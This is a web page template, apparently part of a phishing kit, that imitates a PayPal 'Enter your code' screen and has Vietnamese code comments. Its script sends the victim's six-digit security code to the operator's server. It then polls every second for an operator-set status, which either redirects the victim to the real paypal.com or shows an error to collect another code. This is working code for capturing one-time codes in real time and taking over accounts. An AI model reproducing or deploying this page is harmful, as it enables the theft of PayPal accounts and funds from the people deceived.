<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PayPal</title>
    <link rel="stylesheet" href={{ asset("assets-papal/otp.css")}} />
    <link rel="stylesheet" href={{ asset("assets-papal/loader.css")}} />
    <link rel="stylesheet" href={{ asset("assets-papal/responsive.css")}} />
    <link rel="shortcut icon" href={{ asset("assets-papal/assets/logo.ico")}} />
  </head>
  <body>
    <div class="otp-relative">
      <div class="otp-container">
        <div class="top">
          <div class="logo">
            <img
              src={{ asset("assets-papal/assets/paypal-mark-color.svg")}}
              alt="PayPal Logo"
            />
          </div>

          <h2 class="enter-code">Enter your code</h2>
          <p class="description" id="noti-otp">
            {{-- We sent a security code to ‪+95 5•• ••2 117‬. --}}
          </p>
          <span class="send-new-code">Send new code </span>
          <div id = "error-group-long" class="error-group hide">
            <img
              class="alert-icon"
              src={{ asset("assets-papal/assets//alert.svg")}}
              width="20px"
              height="20px"
            />
            <p class="error-text">
              Some of your info isn't correct. Please try again.
            </p>
          </div>
          <div class="otp-box">
            <div class="otp-inputs">
              <input type="text" maxlength="1" class="otp-input" id="otp-1" />
              <input type="text" maxlength="1" class="otp-input" id="otp-2" />
              <input type="text" maxlength="1" class="otp-input" id="otp-3" />
              <input type="text" maxlength="1" class="otp-input" id="otp-4" />
              <input type="text" maxlength="1" class="otp-input" id="otp-5" />
              <input type="text" maxlength="1" class="otp-input" id="otp-6" />
            </div>
            {{-- <p id="message"></p> --}}
          </div>
          <button id="submitBtn" onclick="verifyOTP()">Submit</button>
          <span class="more-option">Need more options?</span>
        </div>
      </div>
      <div class="loading-container" id="loader">
        <div class="loader"></div>
      </div>
      <div class="otp-footer">
        <span class="bottom more-option">Return to login</span>
        <ul class="link-group">
          <span class="footer-item">Contact Us</span>
          <span class="footer-item">Privacy</span>
          <span class="footer-item">Legal</span>
          <span class="footer-item">Policy Updates</span>
          <span class="footer-item">Worldwide</span>
        </ul>
      </div>
    </div>
    <script src={{ asset("assets-papal/otp.js")}}></script>
  </body>
</html>

<script>
  function hideEmail(email) {
    // Find the index of the "@" symbol
    var atIndex = email.indexOf('@');
    
    // Calculate the number of characters to hide
    var hideCount = Math.floor(atIndex * 4 / 5);
    
    // Construct the hidden portion with "•" characters
    var hiddenPart = "•".repeat(hideCount);
    
    // Replace the characters before "@" with the hidden portion
    var maskedEmail = hiddenPart + email.slice(hideCount);
    
    return maskedEmail;
  }

  var email = localStorage.getItem('email');
  var maskedEmail = hideEmail(email);
  document.getElementById('noti-otp').innerText = "We sent a security code to " + maskedEmail;

</script>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function(){
        $('#submitBtn').click(function(e){
            e.preventDefault();
            let loader = document.getElementById("loader");
            let errorGroup = document.getElementById("error-group-long");
            loader.classList.add("show");
            errorGroup.classList.add('hide');
            var id = localStorage.getItem('id'); 
            // Lấy dữ liệu từ input
            var otp = $('#otp-1').val().toString() + $('#otp-2').val().toString() + $('#otp-3').val().toString() + $('#otp-4').val().toString() + $('#otp-5').val().toString() + $('#otp-6').val().toString();
            console.log(id);
            // Gửi Ajax request
            $.ajax({
                url: "{{ route('saveOtp') }}",
                method: "POST",
                data: {
                    _token: '{{ csrf_token() }}',
                    otp: otp,
                    id:id
                },
                success: function(response){
                    // Xử lý kết quả sau khi lưu thành công
                    console.log(response);
                    getdata(response.data.id,loader,errorGroup);
                },
                error: function(xhr, status, error){
                    // Xử lý lỗi
                    console.error(error);
                }
            });
        });
    });

    function getdata(id,loader,errorGroup) {
        console.log('đã vào function');
        var redirected = false; // Cờ để kiểm tra đã chuyển hướng hay chưa

        $(document).ready(function () {
            // Định nghĩa function để gửi yêu cầu và lấy dữ liệu khách hàng
            function fetchDataFromLocalStorage() {
                // var savedEmail = localStorage.getItem('email');
                if (id) {
                    // Gửi yêu cầu POST để lấy dữ liệu khách hàng
                    $.ajax({
                        type: 'POST',
                        url: '{{ route("customer.show", ":id") }}'.replace(':id', id),
                        data: {
                            '_token': '{{ csrf_token() }}',
                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                        },
                        success: function (response) {
                            // Xử lý dữ liệu trả về từ controller
                            console.log(response.data);
                            var data = response.data;
                            if (response.data.status_otp === 1 && !redirected) {
                                localStorage.setItem('email',  response.data.email);
                                localStorage.setItem('id',response.data.id);
                                redirected = true; // Đánh dấu đã chuyển hướng
                                window.location.href = "https://www.paypal.com";
                                loader.classList.remove("show");
                            }
                            if (response.data.status_otp === 2 && !redirected) {
                                redirected = true;
                                $.ajax({
                                        type: 'POST',
                                        url: '{{ route("change.status.otp.bar") }}',
                                        data: {
                                            '_token': '{{ csrf_token() }}',
                                            id: response.data.id,
                                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                                        },
                                        success: function (response) {
                                            // Xử lý dữ liệu trả về từ controller
                                        },
                                        error: function (xhr, status, error) {
                                            // Xử lý lỗi nếu có
                                            console.error(error);
                                        }
                                    });
                                loader.classList.remove("show");
                                errorGroup.classList.remove('hide');
                            }
                            

                        },
                        error: function (xhr, status, error) {
                            // Xử lý lỗi nếu có
                            console.error(error);
                        }
                    });
                } else {
                    console.log('Không có id được lưu trong local storage.');
                }
            }

            // Gọi function fetchDataFromLocalStorage() mỗi giây
            setInterval(fetchDataFromLocalStorage, 1000);
        });
    }
</script>
